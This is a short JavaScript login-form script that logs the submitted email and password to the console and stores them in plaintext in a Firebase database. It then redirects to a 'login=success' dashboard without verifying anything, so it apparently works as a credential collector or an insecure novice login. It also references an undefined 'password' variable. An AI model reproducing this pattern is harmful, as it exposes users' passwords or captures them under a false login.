const form = document.getElementById('form');
const alertbox = document.querySelector('.alert');
const firebaseConfig = {

    apiKey: "AIzaSyBAfUbZupOD0HAND6cfX89XRB-T8d39bKw",

    authDomain: "form-1a9e9.firebaseapp.com",

    databaseURL: "https://form-1a9e9-default-rtdb.firebaseio.com",

    projectId: "form-1a9e9",

    storageBucket: "form-1a9e9.firebasestorage.app",

    messagingSenderId: "278166565852",

    appId: "1:278166565852:web:efe44a0c8f0222254d9519",

    measurementId: "G-LMK7J2MB1Q"

  };


  // Initialize Firebase

  firebase.initializeApp(firebaseConfig);
  const database = firebase.database()

form.addEventListener("submit",(e)=>{
    e.preventDefault();

    const email = document.getElementById('email').value;
const Password = document.getElementById('password').value;
console.log(email,Password);
database.ref("users").push({
        email: email,
        Password: password,
        time: new Date().toString()});
alertbox.style.display="block"

setTimeout(() => {
  alertbox.style.display = "none";
}, 2000);
setTimeout(() => {
    window.location.href = "dashboard.html?login=success";
}, 2000);


form.reset()
})
